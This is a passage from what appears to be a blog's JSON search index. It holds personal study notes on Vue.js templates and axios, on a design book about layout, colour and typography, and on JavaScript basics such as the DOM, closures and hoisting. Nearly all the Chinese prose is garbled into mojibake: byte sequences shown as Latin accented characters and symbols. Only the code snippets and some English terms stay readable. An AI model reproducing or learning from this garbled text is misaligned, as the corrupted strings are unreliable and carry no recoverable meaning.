ËÆ°ÁÆóÂ±ûÊÄßÊúâgetterÂíåsetter5.ClassÂíåStyleÁªëÂÆö  ÁªëÂÆöHTMLÁ±ªÔºöv-bind:class=‚Äù{}‚Äù  ÁªëÂÆöÂÜÖËÅîÊ†∑ÂºèÔºöv-bind:style=‚Äù{}‚Äù6.Êù°‰ª∂Ê∏≤Êüì  v-if/v-else      Â§çÁî®ÂÖÉÁ¥†ÔºöÈÄöËøákey‰ΩøÂæóÂèòÊç¢placeholderÊó∂ËæìÂÖ•ÂÜÖÂÆπ‰ºöÂà†Èô§      &lt;template v-if=\"loginType === 'username'\"&gt;    &lt;label&gt;Username&lt;/label&gt;    &lt;input placeholder=\"Enter your username\" key=\"username-input\"&gt;  &lt;/template&gt;  &lt;template v-else&gt;    &lt;label&gt;Email&lt;/label&gt;    &lt;input placeholder=\"Enter your email address\" key=\"email-input\"&gt;  &lt;/template&gt;        v-if/v-showÔºöv-ifÊòØÊù°‰ª∂Ê∏≤ÊüìÔºåÂè™Âú®Êù°‰ª∂‰∏∫ÁúüÊó∂ÊâçÊ∏≤ÊüìÔºõv-showÊÄªÊòØÊ∏≤ÊüìÔºåÂè™ÊòØÈÄöËøáCSSËøõË°åÂèòÊç¢ÊòØÂê¶ÊòæÁ§∫„ÄÇ7.ÂàóË°®Ê∏≤Êüìv-forÔºöÂèØÈÄâÁöÑÁ¨¨‰∫åÂèÇÊï∞‰Ωú‰∏∫ÂΩìÂâçÈ°πÁöÑÁ¥¢Âºï\t&lt;ul id=\"example-2\"&gt;\t  &lt;li v-for=\"(item, index) in items\"&gt;\t     -  - \t  &lt;/li&gt;\t&lt;/ul&gt;Êï∞ÁªÑÊõ¥Êñ∞Ê£ÄÊµãÔºå‰øÆÊîπÊñπÊ≥ïÔºö  push()  pop()  shift()  unshift()  splice()  sort()  reverse()Êñ∞ÊóßÊï∞ÁªÑÊõøÊç¢Ôºö  filter()  concat()  slice()8.‰∫ã‰ª∂Â§ÑÁêÜÂô®:v-on:click      ‰∫ã‰ª∂‰øÆÈ•∞Á¨¶Ôºö      &lt;!-- ÈòªÊ≠¢ÂçïÂáª‰∫ã‰ª∂ÂÜíÊ≥° --&gt;  &lt;a v-on:click.stop=\"doThis\"&gt;&lt;/a&gt;  &lt;!-- Êèê‰∫§‰∫ã‰ª∂‰∏çÂÜçÈáçËΩΩÈ°µÈù¢ --&gt;  &lt;form v-on:submit.prevent=\"onSubmit\"&gt;&lt;/form&gt;  &lt;!-- ‰øÆÈ•∞Á¨¶ÂèØ‰ª•‰∏≤ËÅî  --&gt;  &lt;a v-on:click.stop.prevent=\"doThat\"&gt;&lt;/a&gt;  &lt;!-- Âè™Êúâ‰øÆÈ•∞Á¨¶ --&gt;  &lt;form v-on:submit.prevent&gt;&lt;/form&gt;  &lt;!-- Ê∑ªÂä†‰∫ã‰ª∂‰æ¶Âê¨Âô®Êó∂‰ΩøÁî®‰∫ã‰ª∂ÊçïËé∑Ê®°Âºè --&gt;  &lt;div v-on:click.capture=\"doThis\"&gt;...&lt;/div&gt;  &lt;!-- Âè™ÂΩì‰∫ã‰ª∂Âú®ËØ•ÂÖÉÁ¥†Êú¨Ë∫´ÔºàÊØîÂ¶Ç‰∏çÊòØÂ≠êÂÖÉÁ¥†ÔºâËß¶ÂèëÊó∂Ëß¶ÂèëÂõûË∞É --&gt;  &lt;div v-on:click.self=\"doThat\"&gt;...&lt;/div&gt;            ÈîÆÂÄº‰øÆÈ•∞Á¨¶          .enter      .tab      .delete (ÊçïËé∑ ‚ÄúÂà†Èô§‚Äù Âíå ‚ÄúÈÄÄÊ†º‚Äù ÈîÆ)      .esc      .space      .up      .down      .left      .right      9.Ë°®ÂçïÊéß‰ª∂ÁªëÂÆö      ÊñáÊú¨      &lt;input v-model=\"message\" placeholder=\"edit me\"&gt;  &lt;p&gt;Message is: &lt;/p&gt;            Â§öË°åÊñáÊú¨      &lt;span&gt;Multiline message is:&lt;/span&gt;  &lt;p style=\"white-space: pre-line\"&gt;&lt;/p&gt;  &lt;br&gt;  &lt;textarea v-model=\"message\" placeholder=\"add multiple lines\"&gt;&lt;/textarea&gt;            Â§çÈÄâÊ°Ü  HTMLÔºö\t&lt;input type=\"checkbox\" id=\"jack\" value=\"Jack\" v-model=\"checkedNames\"&gt;\t&lt;label for=\"jack\"&gt;Jack&lt;/label&gt;\t&lt;input type=\"checkbox\" id=\"john\" value=\"John\" v-model=\"checkedNames\"&gt;\t&lt;label for=\"john\"&gt;John&lt;/label&gt;\t&lt;input type=\"checkbox\" id=\"mike\" value=\"Mike\" v-model=\"checkedNames\"&gt;\t&lt;label for=\"mike\"&gt;Mike&lt;/label&gt;\t&lt;br&gt;\t&lt;span&gt;Checked names: &lt;/span&gt;JSÔºö\tnew Vue({\t  el: '...',\t  data: {\t    checkedNames: []\t  }\t})  ÂçïÈÄâÊåâÈíÆ  ÈÄâÊã©ÂàóË°®  ËØ¶ËßÅÔºöhttp://cn.vuejs.org/v2/guide/forms.htmlÊòæÁ§∫ËæìÂá∫:console.log()ÁªÑ‰ª∂  Áà∂ÁªÑ‰ª∂ÈÄöËøá props Âêë‰∏ã‰º†ÈÄíÊï∞ÊçÆÁªôÂ≠êÁªÑ‰ª∂ÔºåÂ≠êÁªÑ‰ª∂ÈÄöËøá events ÁªôÁà∂ÁªÑ‰ª∂ÂèëÈÄÅÊ∂àÊÅØ„ÄÇ8/8  axiosÂÆûÁé∞restful api  Êõ¥Êñ∞/ÂÆâË£ÖvueÂ∫ìÔºönpm install vue-loader  ÈÅáÂà∞axiosÊñáÊ°£‰∏≠ÁöÑ‰æãÂ≠ê‰∏çÁ¨¶ÂêàES6Ê†áÂáÜÔºå‰øÆÊîπ‰ª£Á†Å   const vm = this; // console.log(`ttt, ${this.$http.get('/api/info')}`); this.$http.get('/api/info') .then((res) =&gt; { vm.axios = res; }) .catch(err =&gt; console.log(err));  #‰øÆÊîπconfig/index.jsproxyTable: {  '/api': {    target: 'http://192.168.10.10/',    changeOrigin: true  }}‚Äã  We can use style scoped to restrict the css to just set for the current component."
  },
  
  {
    "title": "‰ªéÈõ∂ÂºÄÂßãÂ≠¶ËÆæËÆ°[Êó•]ÂåóÊùëÂ¥á",
    "url": "/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E8%AE%BE%E8%AE%A1/",
    "categories": "",
    "tags": "Design",
    "date": "2017-05-08 00:00:00 -0700",
    





    
    "snippet": "1.ÁâàÂºèÂü∫Á°ÄÔºöÈù†ËøëÔºöÂÖ≥ËÅîÊÄßÈ´òÁöÑË¶ÅÁ¥†ËøõË°åÁæ§ÁªÑÈáçÂ§çÔºöË¶ÅÁ¥†ÁöÑÂΩ¢ÂºèÈáçÂ§çÂá∫Áé∞ÂØπÊØîÔºöË¶ÅÁ¥†Â§ßÂ∞è‰ª•ÂèäÂÖàÂêéÊ¨°Â∫èÁöÑÈÄâÊã©ÊéíÈΩêÔºöÊåâÁÖßÂü∫ÂáÜÔºàÁ≠âÈó¥Èöî„ÄÅ‰ª•‰∏ÄÊù°Á∫ø‰∏∫Âü∫ÂáÜÔºâÈªÑÈáëÊØîÔºö1Ôºö1.618    Êõ¥‰Ω≥Ëá™ÁÑ∂ÁôΩÈì∂ÊØîÔºö1Ôºö1.414  Ê≥®Ôºö          ÂèçÂ∑ÆÁéáÔºöÊ†áÈ¢òË∂äÂ§ßÔºåÂäõÈáèÊÑüË∂äÂº∫      ÊñáÂ≠óÂê∏ÂºïÂäõÔºöÂä†Á≤ó„ÄÅÊîπÂèòÈ¢úËâ≤„ÄÅÂä†Â§ß„ÄÅÊîπÂèòÂ≠ó‰ΩìÔºàÂº∫Ë∞ÉÁöÑÊó∂ÂÄôÈôêÂÆö‰∏§ÁßçÔºâ      ÂõæÁâáÂê∏ÂºïÂäõÔºöÂä†Â§ß„ÄÅÊîπÂèòÈ¢úËâ≤„ÄÅÂÄæÊñú„ÄÅÊîπÂèòÂΩ¢Áä∂ÔºàÈôêÂÆö‰∏§Áßç...",
    "content": "1.ÁâàÂºèÂü∫Á°ÄÔºöÈù†ËøëÔºöÂÖ≥ËÅîÊÄßÈ´òÁöÑË¶ÅÁ¥†ËøõË°åÁæ§ÁªÑÈáçÂ§çÔºöË¶ÅÁ¥†ÁöÑÂΩ¢ÂºèÈáçÂ§çÂá∫Áé∞ÂØπÊØîÔºöË¶ÅÁ¥†Â§ßÂ∞è‰ª•ÂèäÂÖàÂêéÊ¨°Â∫èÁöÑÈÄâÊã©ÊéíÈΩêÔºöÊåâÁÖßÂü∫ÂáÜÔºàÁ≠âÈó¥Èöî„ÄÅ‰ª•‰∏ÄÊù°Á∫ø‰∏∫Âü∫ÂáÜÔºâÈªÑÈáëÊØîÔºö1Ôºö1.618    Êõ¥‰Ω≥Ëá™ÁÑ∂ÁôΩÈì∂ÊØîÔºö1Ôºö1.414  Ê≥®Ôºö          ÂèçÂ∑ÆÁéáÔºöÊ†áÈ¢òË∂äÂ§ßÔºåÂäõÈáèÊÑüË∂äÂº∫      ÊñáÂ≠óÂê∏ÂºïÂäõÔºöÂä†Á≤ó„ÄÅÊîπÂèòÈ¢úËâ≤„ÄÅÂä†Â§ß„ÄÅÊîπÂèòÂ≠ó‰ΩìÔºàÂº∫Ë∞ÉÁöÑÊó∂ÂÄôÈôêÂÆö‰∏§ÁßçÔºâ      ÂõæÁâáÂê∏ÂºïÂäõÔºöÂä†Â§ß„ÄÅÊîπÂèòÈ¢úËâ≤„ÄÅÂÄæÊñú„ÄÅÊîπÂèòÂΩ¢Áä∂ÔºàÈôêÂÆö‰∏§ÁßçÔºâ      ÂºïÂØºËßÜÁ∫øÔºöZÂΩ¢ÔºöFÂΩ¢ÔºöNÂΩ¢ÔºöÊó•ÂºèÔºå‰ªéÂè≥Ëá≥Â∑¶ÁïôÁôΩÔºöÂáèÂ∞ëÂõæÁâáÂç†ÊçÆÁöÑÂ§ßÂ∞è  Ê≥®Ôºö          Ë¶ÅÁ¥†ËÆæÁΩÆ‰∏∫Âêå‰∏ÄÁ≥ªÂàóÊàñÊ®°ÂºèÔºåÂèØ‰ª•ËÆ©‰∫∫‰ª¨‰ª•Ê≠§Á°ÆËÆ§ÂÜÖÂÆπ      Áî®Êï∞Â≠óÊàñÁÆ≠Â§¥Âº∫Âà∂Âõ∫ÂÆöËßÜÁ∫øËµ∞Ê≥ï      Âä†ÂÖ•ÂõæÁâáÔºåÁî®‰∫∫Áâ©ÁÖßÁâáÔºåÊääÊñáÂ≠óÂä†Âú®‰∫∫Áâ©ËßÜÁ∫øÂ§Ñ      ÁâàÂºèÁöÑÂÆûË∑µÔºö  ‰ª•ÈªëÁôΩÁ®øÁ°ÆÂÆöÁâàÂºèÁªìÊûÑ  ÊîπÂèòÁÖßÁâáÁöÑË£ÅÂâ™ÊØî‰æã  ÁÅµÊ¥ªËøêÁî®ÂØπÁß∞ÂíåÈùûÂØπÁß∞          ÂØπÁß∞ÂõæÁâáÔºå‰ª•‰∏≠ÂøÉÁ∫ø‰∏∫ËΩ¥ÔºåËæÉÊúâÁ®≥ÂÆöÊÑü      ÈùûÂØπÁß∞ÂõæÁâáÔºåÊï¥‰ΩìÂØπÁß∞ÔºåÂ±ÄÈÉ®Âä†‰∏äÈùûÂØπÁß∞Á¥†ÊùêÔºåÊ¥ªÊ≥º      2.ÈÄ†ÂûãÂü∫Á°ÄÔºö  ÂΩ¢Áä∂Áªô‰∫∫Âç∞Ë±°Ôºö          ÂúÜÔºöÊ∏©ÊüîÔºåÂúÜÊª°ÔºåÂ≠©Â≠êÔºåÂø´‰πê      ÂõõËæπÂΩ¢ÔºöÂÆâÂÆö„ÄÅÂéöÈáç„ÄÅ‰ø°Ëµñ      ‰∏âËßíÂΩ¢ÔºöÁ∫§ÁªÜ„ÄÅÁ®≥ÂÆö„ÄÅÂ∞ñÈîê      ËÆæËÆ°ÈÄ†ÂûãÔºöÊäΩË±°ÂåñÔºåÁî®Âü∫Êú¨ÂõæÂΩ¢Ë°®Á§∫Ôºå‰ΩøÁî®ÈªÑÈáëÊØîÂíåÁôΩÈì∂ÊØîÂõæÂΩ¢ÂíåÁ¨¶Âè∑ÂõæÂΩ¢ÂíåÊñáÂ≠óÈÖçÂêà‰ΩøÁî®ÔºåÈÄö‰øóÊòìÊáÇ  Ê†πÊçÆÁ¨¶Âè∑ÁâπÂæÅÁöÑÂàÜÁ±ªÔºöË°å‰∏∫Á¨¶Âè∑„ÄÅÊÄßË¥®Á¨¶Âè∑„ÄÅËßÜËßâÁ¨¶Âè∑„ÄÅÊäΩË±°Á¨¶Âè∑  Ê†πÊçÆÁ¨¶Âè∑ÂÜÖÂÆπÁöÑÂàÜÁ±ªÔºöÊó∂Èó¥ÁöÑË°®Áé∞„ÄÅÂú∞ÁÇπÁöÑË°®Áé∞„ÄÅ‰∫∫Áâ©ÁöÑË°®Áé∞„ÄÅÂØπË±°ÁöÑË°®Áé∞„ÄÅË°å‰∏∫ÁöÑË°®Áé∞ÈÄ†ÂûãÁöÑÂÆûË∑µ  ÁªòÂà∂ÂõæÊ†á  ÊèêÂèñÈáçË¶ÅÂÖÉÁ¥†  ÁùÄËâ≤ÊèêÈ´òÂØπÊØîÂ∫¶  Ë∞ÉÊï¥Â∞∫ÂØ∏ÂàõÊÑèËÆ≠ÁªÉÔºàÂõæÊ†áËÆæËÆ°ÔºâÔºö  Ê†πÊçÆ‰∏Ä‰∏™‰∏ªÈ¢òÔºåÊÉ≥Âá∫Áõ∏ÂÖ≥ÁöÑ‰∫ãÁâ©ÔºåÂÖ®ÈÉ®ÁΩóÂàóÂá∫Êù•„ÄÇ  Êää‰∫ãÁâ©ÂΩíÁ±ªÂà∞Êó∂Èó¥„ÄÅÂú∞ÁÇπ„ÄÅ‰∫∫Áâ©„ÄÅÂØπË±°„ÄÅË°®Áé∞‰∏≠  Ê†πÊçÆÂÖ≥ÈîÆËØçÈÄÜÂêëÊÄùËÄÉÂÖ≥ËÅîÁöÑ‰∫ãÁâ©  ÈÄâÂèñ‰∏é‰∏ªÈ¢òÊúÄÊé•ËøëÁöÑÂÖ≥ÈîÆËØçÔºåÂÅöÊàêÂõæÊ†áÊ≥®Ôºö  Ê≥®ÊÑèÈîôËßâÔºåËã±ÊñáÂ≠óÊØçLTÊ®™Á´ñÁ≤óÁªÜ‰∏ç‰∏ÄÊ†∑  ‰∫∫Áâ©ÈÄ†ÂûãÁöÑËÆæËÆ°ËøòË¶ÅËÄÉËôëÈáçÂøÉ‰∏çËÉΩÂ§™ÂÅè3.Ëâ≤ÂΩ©ÁöÑÁßçÁ±ªËâ≤ÂΩ©ÁöÑÁßçÁ±ª  ÂÖâÊ∫êËâ≤ÂíåÁâ©‰ΩìËâ≤  ÂÖâÁöÑ‰∏âÂéüËâ≤RGB  Ëâ≤ÊñôÁöÑ‰∏âÂéüËâ≤CMYÔºàKÔºâ          Cyan Èùí      Megenta Ê¥ãÁ∫¢      Yellow ÈªÑ      ÈÖçËâ≤  Ëâ≤Áõ∏ Hue          Ë°•Ëâ≤ Ëâ≤Áõ∏ÁéØÂØπËßíÁ∫øÈ¢úËâ≤      ÂàÜË£ÇÈ¢úËâ≤ ‰∏ÄÂØπ‰∫å      ‰∏âËâ≤ÈÖçËâ≤      ÂõõËâ≤ÈÖçËâ≤      ‰∏ª‰ΩìËâ≤ÈÖçËâ≤Âíå‰∏ªËâ≤Ë∞ÉÈÖçËâ≤      Âü∫Á°ÄËâ≤ÔºàËÉåÊôØÔºâ70%-‰∏ªËâ≤ÔºàÊ†∏ÂøÉÔºâ25%-‰∫ÆËâ≤ÔºàÁÇπÁºÄÔºâ5%        ÊòéÂ∫¶ Brightness      Á∫ØÂ∫¶ Saturation    ÂÜ≥ÂÆöÈÖçËâ≤ÁöÑÊñπÊ≥ï          ‰∏ªËâ≤ÊòéÂ∫¶‰∏çÂ§™È´òÔºåÁ∫ØÂ∫¶‰∏çÂ§™‰ΩéÔºàÊé®ËçêÔºöËìù„ÄÅÁ∫¢„ÄÅÊ©ôÔºâ      Âü∫Á°ÄËâ≤ÈÄâÊã©ËæÉÊµÖ„ÄÅÊòéÂ∫¶ËæÉÈ´ò„ÄÅÁ∫ØÂ∫¶ËæÉ‰Ωé      ‰∫ÆËâ≤ÈÄâÊã©Ë°•Ëâ≤      Â¢ûÂä†ÈÖçËâ≤ÔºöÊØî‰æã‰øùÊåÅ‰∏çÂèòÔºåÂêå‰∏ÄÁßçÁ±ªÂûãÁöÑËâ≤ÂùóÂèØ‰ª•ÈÄâÁõ∏ËøëÁöÑÈ¢úËâ≤Ëâ≤ÂΩ©ÁöÑÁâπÊÄß  ÈÜíÁõÆÂ∫¶          Êó†ÂΩ©Ëâ≤ &lt; ÊúâÂΩ©Ëâ≤      ‰ΩéÁ∫ØÂ∫¶ &lt; È´òÁ∫ØÂ∫¶      ËìùÁªøËâ≤Á≥ª &lt; Á∫¢ÈªÑËâ≤Á≥ª        ÂâçËøõËâ≤ÔºàÊöñËâ≤Á≥ªÔºâÂíåÂêéÈÄÄËâ≤ÔºàÂÜ∑Ëâ≤Á≥ªÔºâ  ËÜ®ËÉÄËâ≤ÔºàÊµÖËâ≤ÔºâÂíåÊî∂Áº©Ëâ≤ÔºàÊ∑±Ëâ≤ÔºâÈÖçËâ≤ÁöÑÂÆûË∑µ  ‰∏ªËâ≤„ÄÅ‰∫ÆËâ≤ÊØîËæÉÈù†ËøëÔºåÂÖ∂Èó¥Âä†ÂÖ•Âü∫Á°ÄËâ≤  Âü∫Á°ÄËâ≤Áî®ÂçïËâ≤ÔºåÊòéÂ∫¶‰∏é‰∏ªËâ≤ÊãâÂºÄÂ∑ÆË∑ù4.ÊñáÂ≠óÊéíÁâàÂ≠ó‰Ωì  ÂÆã‰Ωì‚Äî‚ÄîÊúâË°¨Á∫øÂ≠ó‰Ωì  Èªë‰Ωì‚Äî‚ÄîÊó†Ë°¨Á∫øÂ≠ó‰Ωì  Á≤ó‰Ωì„ÄÅÊñú‰Ωì  Á≠âÂπÖÂ≠ó‰ΩìÔºàÊØè‰∏™Â≠óÂç†ÊçÆÂ§ßÂ∞è‰∏ÄÊ†∑ÔºâÂíåÊØî‰æãÂ≠ó‰ΩìÔºà‰∏ç‰∏ÄÊ†∑ÔºâÊñáÂ≠óÊéíÁâà  Ë°åÈó¥Ë∑ùÔºöÊñáÂ≠óÂ§ßÂ∞èÁöÑ150%ÔΩû180%  ‰∏ÄË°å15ÔΩû40Â≠ó  Ë°åÂÆΩÂíåË°åÈó¥Ë∑ùÊàêÊØî‰æãÂèòÂÆΩÊàñÂèòÁ™Ñ  Â§ßÊ†áÈ¢òÂíåÊ≠£ÊñáË¶ÅÂº∫Âº±ÂØπÊØî5.ËÆæËÆ°ÁöÑÊÄùÁª¥Ê®°Âºè‰ª•‰∫∫‰∏∫Êú¨ÁöÑËÆæËÆ°  UIÔºàUser InterfaceÔºâ  UXÔºàUser eXperienceÔºâ      ÈóÆËØ¢Ë°®    ËÆæËÆ°ËØæÈ¢ò  ÂïÜÂìÅÂêçÁß∞„ÄÅÊúçÂä°ÂêçÁß∞  ‰øÉÈîÄË¶ÅÁÇπ  Á´û‰∫âÂØπÊâãÁöÑÂïÜÂìÅ  ÁõÆÊ†á‰∫∫Áæ§  ÈóÆÈ¢òÁÇπ  È¢ÑÊÉ≥ÁöÑÊàêÊûúÁâ©  Êó•Á®ã  Á¥†Êùê„ÄÅËµÑÊñô    ÂºïÂØºË°å‰∏∫Ôºö‰∫∫‰ª¨‰ºòÂÖàÈÄâÊã©Ë¥üÊãÖÂ∞èÁöÑÊàñÂèØÊúüÂæÖÁöÑÁªìÊûú"
  },
  
  {
    "title": "JavaScript Learning",
    "url": "/posts/JavaScript_Learning/",
    "categories": "",
    "tags": "Website",
    "date": "2017-04-18 00:00:00 -0700",
    





    
    "snippet": "Â≠¶‰π†ÁõÆÂΩïÔºö  Javascript DOM ÁºñÁ®ãËâ∫ÊúØ  Mastering Javascript  Design Patterns: Elements of Reusable Object-Oriented Software  ÈîãÂà©ÁöÑjQuery  JavascriptÈ´òÁ∫ßÁ®ãÂ∫èËÆæËÆ°Javascript DOM ÁºñÁ®ãËâ∫ÊúØ1. JavaScriptÁÆÄÂè≤1.1 JavaScriptÊòØ‰∏ÄÁßçËÑöÊú¨ËØ≠Ë®ÄÔºå...",
    "content": "Â≠¶‰π†ÁõÆÂΩïÔºö  Javascript DOM ÁºñÁ®ãËâ∫ÊúØ  Mastering Javascript  Design Patterns: Elements of Reusable Object-Oriented Software  ÈîãÂà©ÁöÑjQuery  JavascriptÈ´òÁ∫ßÁ®ãÂ∫èËÆæËÆ°Javascript DOM ÁºñÁ®ãËâ∫ÊúØ1. JavaScriptÁÆÄÂè≤1.1 JavaScriptÊòØ‰∏ÄÁßçËÑöÊú¨ËØ≠Ë®ÄÔºåÈÄöÂ∏∏Âè™ËÉΩÈÄöËøáWebÊµèËßàÂô®ÂéªÂÆåÊàê‰∏Ä‰∫õÊìç‰ΩúËÄå‰∏çËÉΩÂÉèÊôÆÈÄöÊÑè‰πâ‰∏äÁöÑÁ®ãÂ∫èÈÇ£Ê†∑Áã¨Á´ãËøêË°å1.2 DOMÊòØ‰∏ÄÂ•óÂØπÊñáÊ°£ÁöÑÂÜÖÂÆπËøõË°åÊäΩË±°ÂíåÊ¶ÇÂøµÂåñÁöÑÊñπÊ≥ï„ÄÇW3CÂØπDOMÁöÑÂÆö‰πâÔºö‰∏Ä‰∏™‰∏éÁ≥ªÁªüÂπ≥Âè∞ÂíåÂèòÊàêËØ≠Ë®ÄÊó†ÂÖ≥ÁöÑÊé•Âè£ÔºåÁ®ãÂ∫èÂíåËÑöÊú¨ÂèØ‰ª•ÈÄöËøáËøô‰∏™Êé•Âè£Âä®ÊÄÅÁöÑËÆøÈóÆÂíå‰øÆÊîπÊñáÊ°£ÁöÑÂÜÖÂÆπ„ÄÅÁªìÊûÑÂíåÊ†∑Âºè„ÄÇ2.JavaScriptËØ≠Ê≥ï2.1ÁªìÊûÑÊñπÊ≥ï1:ÊîæÂú®&lt;head&gt;Ê†áÁ≠æ‰∏≠&lt;script&gt;\tJavaScript goes here...&lt;/script&gt;   ÊñπÊ≥ï2:ÊîæÂú®&lt;body&gt;Ê†áÁ≠æ‰∏≠&lt;script src=\"file.js\"&gt;&lt;/script&gt;2.2ÂèòÈáè//JSÊòØÂº±Á±ªÂûãvar mood = 33;alert(mood);//ÂÖ≥ËÅîÊï∞ÁªÑvar lennon = Array();lennon[\"name\"] = \"John\";//ÂØπË±°var lennon = Object();lennon.name = \"John\";2.3Êìç‰ΩúÁ¨¶Êù°‰ª∂ËØ≠Âè•Ôºöif,elseÊØîËæÉÊìç‰ΩúÁ¨¶Ôºö&lt;&gt;=,==,===ÈÄªËæëÊìç‰ΩúÁ¨¶Ôºö&amp;&amp;,!,||Âæ™ÁéØËØ≠Âè•Ôºöwhile,for3.DOM3.1 ÂÆö‰πâD:document(ÊñáÊ°£)O:Object(ÂØπË±°)M:Model(Ê®°Âûã)3.2 Ëé∑ÂèñÂÖÉÁ¥†:ÈÄöËøáÂÖÉÁ¥†ID„ÄÅÊ†áÁ≠æÂêçÂ≠ó„ÄÅÁ±ªÂêçÂ≠ógetElementById()getElementsByTagName()getElementsByClassName()3.3Ëé∑ÂèñËÆæÁΩÆÂ±ûÊÄß.getAttribute().setAttribute()4.JavaScriptÂõæÁâáÂ∫ì5.ÊúÄ‰Ω≥ÂÆûË∑µ5.1Âπ≥Á®≥ÈÄÄÂåñÔºöÂΩìÊµèËßàÂô®‰∏çÊîØÊåÅJavaScriptÊó∂‰πüËÉΩÊ≠£Â∏∏ÊµèËßà„ÄÇÔºàÊêúÁ¥¢Êú∫Âô®‰∫∫Ôºâ7.Âä®ÊÄÅÂàõÂª∫Ê†áËÆ∞7.1‰º†ÁªüÊñπÊ≥ïdocument.write(\"&lt;p&gt;This is inserted.&lt;/p&gt;\");innerHTML    //ÂÖ®ÈÉ®ÂÜÖÂÆπË¢´ÊõøÊç¢createElement()    //ÂàõÂª∫ÂÖÉÁ¥†appendChild()    //ÈôÑ‰∏äÂ≠êËäÇÁÇπcreateTextNode()    //ÂàõÂª∫ÊñáÊú¨insertBefore(newElement,targetElement)    //Âú®Â∑≤ÊúâÂÖÉÁ¥†ÂâçÊèíÂÖ•Êñ∞ÂÖÉÁ¥†insertAfter()7.2Ajax:ÂØπÈ°µÈù¢ÁöÑËØ∑Ê±Ç‰ª•ÂºÇÊ≠•ÊñπÂºèÂèëÈÄÅÁªôÊúçÂä°Âô®Ôºå‰æùËµñÊúçÂä°Âô®Á´ØÂ§ÑÁêÜÔºàHijaxÔºâXMLHttpRequest    8.ÂÖÖÂÆûÊñáÊ°£ÁöÑÂÜÖÂÆπ//Áº©Áï•ËØ≠Ôºö   &lt;abbr title=\"Application Programming Interface\"&gt;API&lt;/abbr&gt;Mastering Javascript [Finished][Indian] Ved AntaniÊú¨‰π¶Âú®Êàë‰∏çÊòØÂæàÁêÜËß£ÁöÑÁ´†ËäÇ‰∏ÄÁõ¥ÊèêÂèä„ÄäËÆæËÆ°Ê®°Âûã„ÄãËøôÊú¨‰π¶ÔºåÂÜ≥ÂÆö‰πãÂêéÂ∞ùËØïÁ†îÁ©∂‰∏Ä‰∏ã„ÄÇ1. JSÂÖ•Èó®1.0 JavaScriptÊîØÊåÅÁöÑÊ†áÂáÜÁ±ªÂûã7ÁßçÔºöNumber, String, Boolean, Symbol, Object, Null, Undefined1.1 NumberÁ±ªÂûãÁöÑÊï∞Â≠óÔºåÂ¶ÇÊûúÂ§ß‰∫éNumber.MAX_VALUEÂàôË¢´ËµãÂÄº‰∏∫Number.POSITIVE_INFINITYÔºõÂèç‰πãÔºåËã•Â∞è‰∫éNumber.MIN_VALUEÂàôË¢´ËµãÂÄº‰∏∫Number.NEGATIVE_INFINITY.1.2 È´òÁ∫ßÊï∞Â≠¶ËÆ°ÁÆó‰ΩøÁî®MathÔºåÂ¶ÇMath.E/Math.SQRT2/Math.abs(-900)/Math.pow(2,3)1.3 parseInt()/parseFloat()Â∞ÜÂ≠óÁ¨¶‰∏≤Ë°®ËææÂºèËΩ¨Êç¢ÊàêÊï¥Êï∞ÊàñÊµÆÁÇπÊï∞1.4 JSHint Ê£ÄÊü•jsÂèØÁñëËØ≠Ê≥ïÁöÑÂ∑•ÂÖ∑„ÄÇ ÂæàÂ§öÈÖçÁΩÆÊñá‰ª∂ÁªìÂ∞æ‰ΩøÁî®rcÔºàbashrc/vimrcÔºâÔºörun comÔºåÊù•Ê∫ê‰∫éUnixÁ•ñÂÖàCTSS‰ΩøÁî®Âêç‰∏∫runcomÊñá‰ª∂Ë°®Á§∫ÂëΩ‰ª§Ë°åËÑöÊú¨ÁâπÂæÅÔºåÊ≤øÁî®Ëá≥‰ªäÁº©ÂÜô‰∏∫rc„ÄÇ2. ÂáΩÊï∞„ÄÅÈó≠ÂåÖ‰∏éÊ®°Âùó2.1 ÂáΩÊï∞Ôºå‰Ωú‰∏∫ÂèÇÊï∞‰º†ÈÄíÁªôÂè¶‰∏Ä‰∏™ÂáΩÊï∞Ôºõ‰Ωú‰∏∫Êï∞ÊçÆËµãÂÄºÁªôÂèòÈáè„ÄÇ2.2 IIFE(Immediately Invoked Function Expression) Á´ãÂç≥Ë∞ÉÁî®ÁöÑÂáΩÊï∞Ë°®ËææÂºè (function() {})();Âíå(function(){}())„ÄÇÁº∫ÁÇπÔºöÂæàÈöæË∞ÉËØï„ÄÅÊó†Ê≥ïÈÄíÂΩí„ÄÅËøáÂ§öIIFE‰ª£Á†ÅÈöæ‰ª•ÈòÖËØª„ÄÇ2.3 javascriptÊ≤°ÊúâÂùó‰ΩúÁî®ÂüüÔºåÂè™ÊúâÂáΩÊï∞‰ΩúÁî®Âüü„ÄÇES6ÂºïÂÖ•letÁîüÊàêÂùó‰ΩúÁî®ÂüüÔºåletÁöÑÂ£∞ÊòéÂú®ÁºñËØëÊó∂‰∏ç‰ºöÊèêÂâçÂà∞Âùó‰ΩúÁî®ÂüüÊúÄÈ°∂ÈÉ®„ÄÇ2.4 ÂáΩÊï∞ÂíåÂèòÈáèÁöÑÂ£∞ÊòéÂú®ÁºñËØëÈò∂ÊÆµ‰ºöË¢´ÁßªÂà∞‰ΩúÁî®ÂüüÁöÑÈ°∂Á´ØÔºàÂáΩÊï∞Ë°®ËææÂºè‰∏ç‰ºöË¢´ÊèêÂçáÔºâÔºåÂáΩÊï∞Âú®ÂÖàÂèòÈáèÂú®ÂêéÔºåËÄåËµãÂÄºÊàñÂÖ∂‰ªñÂèØÊâßË°åÁöÑÈÄªËæë‰æùÁÑ∂‰øùÁïôÂú®Âéü‰Ωç„ÄÇ‰∏çË¶ÅÈÄöËøáÊù°‰ª∂Âà§Êñ≠Áªô‰ΩøÁî®ÂáΩÊï∞Â£∞ÊòéÁªôÂáΩÊï∞Ëµã‰∫à‰∏çÂêåÈÄªËæëÔºåÂõ†‰∏∫ÂáΩÊï∞Â£∞Êòé‰∏çËÉΩÂá∫Áé∞Âú®ÂùóÁªìÊûÑ‰∏≠ÔºåÂõ†‰∏∫ÊâÄÊúâjsÂÆûÁé∞Âú®Ëøô‰∏™ÊñπÈù¢ÂêÑ‰∏çÁõ∏Âêå„ÄÇÂùóÂè™ËÉΩÂåÖÂê´ËØ≠Âè•Ôºå‰∏çËÉΩÂåÖÂê´ÂáΩÊï∞Â£∞Êòé„ÄÇÂ∫îËØ•‰ΩøÁî®ÂáΩÊï∞Ë°®ËææÂºèÊõø‰ª£ÂáΩÊï∞Â£∞Êòé„ÄÇ2.5 argumentsËΩ¨ÂåñÊàêÊï∞ÁªÑÔºövar args = 